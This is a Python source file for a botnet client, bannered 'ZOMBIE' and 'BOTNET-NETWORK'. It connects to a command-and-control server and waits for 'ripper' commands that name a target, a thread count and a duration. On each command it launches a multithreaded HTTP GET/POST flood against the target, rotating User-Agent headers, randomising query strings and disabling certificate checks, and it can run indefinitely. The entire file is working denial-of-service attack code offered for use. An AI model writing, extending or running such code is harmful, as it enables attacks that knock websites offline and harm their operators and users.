import asyncio
import threading
import requests
import random
import time
import re
from urllib.parse import urljoin, urlencode

import pyfiglet
from termcolor import colored

def zombie_banner():
    banner = pyfiglet.figlet_format("ZOMBIE")
    print(colored(banner, "green", attrs=["bold"]))
    print(colored("   ⚠️  BOTNET-NETWORK BY E-404⚠️", "red", attrs=["bold"]))

if __name__ == "__main__":
    zombie_banner()


# from utilities.AgentProfile import AgentProfile

# Minimal AgentProfile definition if the module is missing
class AgentProfile:
    def generate_headers(self):
        # Return a random User-Agent header
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

import urllib3
urllib3.disable_warnings()
 
THREADS = 100
REQUESTS_PER_THREAD = 50
PATHS = ['', 'index.php', 'login.php', 'search.php', 'api/data', 'download.php', '#main']

agent_profile = AgentProfile()

def parse_duration(duration_str):
    # Parse strings like 15m, 1h, 1d, 30s or * for forever
    if duration_str.strip() == '*':
        return -1  # signify forever
    match = re.match(r"^(\d+)([smhd])?$", duration_str.strip().lower())
    if not match:
        return None
    value, unit = match.groups()
    value = int(value)
    if unit == "s" or unit is None:
        return value
    elif unit == "m":
        return value * 60
    elif unit == "h":
        return value * 3600
    elif unit == "d":
        return value * 86400
    return None

def generate_random_query():
    params = {
        "id": random.randint(1, 10000),
        "page": random.choice(["home", "search", "profile"]),
        "q": random.choice(["test", "example", "data"]),
        "ref": random.choice(["google", "bing", "direct"]),
    }
    return urlencode(params)

def http_flood(target, stop_event):
    session = requests.Session()
    while not stop_event.is_set():
        for _ in range(REQUESTS_PER_THREAD):
            if stop_event.is_set():
                break
            path = random.choice(PATHS)
            url = urljoin(target + "/", path)
            if random.random() < 0.5:
                url += "?" + generate_random_query()

            headers = agent_profile.generate_headers()

            try:
                if random.random() < 0.7:
                    r = session.get(url, headers=headers, timeout=5, verify=False)
                else:
                    r = session.post(url, headers=headers, data={"test": "data"}, timeout=5, verify=False)
                print(f"Status {r.status_code} from {threading.current_thread().name} URL: {url}")
            except Exception as e:
                print(f"Error: {e}")

            time.sleep(random.uniform(0.01, 0.2))

async def handle_c2_commands(reader, writer):
    print(f"Connected to C2 server at {writer.get_extra_info('peername')}")

    flood_threads = []
    stop_events = []

    try:
        while True:
            data = await reader.readline()
            if not data:
                print("C2 connection closed.")
                break

            line = data.decode().strip()
            if not line:
                continue
            print(f"Received command: {line}")

            parts = line.split()
            print("command:", parts[0])
            print("length:", len(parts))

            # Support both command formats:
            # send <task_id> ripper <target> <threads> <duration>
            # ripper <target> <threads> <duration> (task_id = 0)
            if len(parts) >= 6 and parts[0].lower() == 'send':
                _, task_id, attack_type, target, threads_str, duration_str = parts[:6]

            elif len(parts) >= 4 and parts[0].lower() == 'ripper':
                task_id = "0"
                attack_type, target, threads_str, duration_str = parts[:4]

            else:
                print(f"Unknown command: {line}")
                continue

            if attack_type.lower() != 'ripper':
                print(f"Unknown attack type: {attack_type}, ignoring.")
                continue

            try:
                threads = int(threads_str)
            except ValueError:
                print(f"Invalid threads count: {threads_str}")
                continue

            duration = parse_duration(duration_str)
            if duration is None:
                print(f"Invalid duration: {duration_str}")
                continue

            print(f"Starting flood on {target} with {threads} threads for duration {duration_str}")

            # Stop previous flood threads if any
            for ev in stop_events:
                ev.set()
            for th in flood_threads:
                th.join()

            flood_threads = []
            stop_events = []

            # Start flood threads
            stop_event = threading.Event()
            stop_events.append(stop_event)
            for i in range(threads):
                t = threading.Thread(target=http_flood, args=(target, stop_event), name=f"FloodThread-{i+1}")
                t.start()
                flood_threads.append(t)

            if duration == -1:
                # Run forever until C2 disconnects or new command
                print("Flood running indefinitely until stopped or next command.")
            else:
                # Wait asynchronously for duration, then stop threads
                await asyncio.sleep(duration)
                print(f"Duration ended. Stopping flood for task {task_id}...")
                stop_event.set()
                for t in flood_threads:
                    t.join()
                flood_threads.clear()
                stop_events.clear()

    except asyncio.CancelledError:
        print("C2 command handler cancelled, cleaning up threads...")
        for ev in stop_events:
            ev.set()
        for t in flood_threads:
            t.join()
    except Exception as e:
        print(f"Exception in C2 command handler: {e}")

async def main():
    c2_ip = "127.0.0.1"   # Change to your C2 IP
    c2_port = 9999        # Change to your C2 port
    print(f"Connecting to C2 at {c2_ip}:{c2_port}...")
    try:
        reader, writer = await asyncio.open_connection(c2_ip, c2_port)
        await handle_c2_commands(reader, writer)
    except Exception as e:
        print(f"Failed to connect or error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
